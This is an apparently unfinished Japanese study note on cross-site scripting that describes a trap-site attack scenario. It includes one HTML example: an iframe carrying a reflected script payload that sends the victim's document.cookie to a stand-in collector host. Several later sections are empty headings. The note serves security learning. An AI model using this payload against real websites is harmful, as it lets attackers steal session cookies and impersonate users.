# security-study

## XSS について調べてみた

### XSS の概要

ターゲットのブラウザ上で攻撃者が用意したスクリプトが実行される。
それによってクッキー値や利用者の個人情報（クレジットカード情報など）が盗まれるといった影響が生じる。

例えば、以下のような手口で行われる。

- 攻撃者が罠サイトを用意する
- 罠サイトの iframe 要素の中に脆弱なサイトが表示される
- クッキー値をクエリ文字列につけると情報収集ページに遷移する（XSS 攻撃！）
- 情報収集ページから攻撃者にクッキー値を送信する
- 罠サイトにターゲット がアクセスすれば XSS 攻撃が成立！
- クッキー値を盗むことで攻撃者はターゲットに成りすませる

```html
<html>
  <body>
    <br /><br />
    <iframe
      width="320"
      height="100"
      src="http://vulnerable-site.com/example.php?
    keyword=<script>window.location='http://unlawfully-collect-cookie-site.com/example.php?sid='%2Bdocument.cookie;</script>"
    ></iframe>
  </body>
</html>
```

### JavaScript による XSS

#### React で発生するケース

### XSS によるセキュリティインシデントの実例

## 参考

安全な Web アプリケーションの作り方 第 2 版 徳丸浩
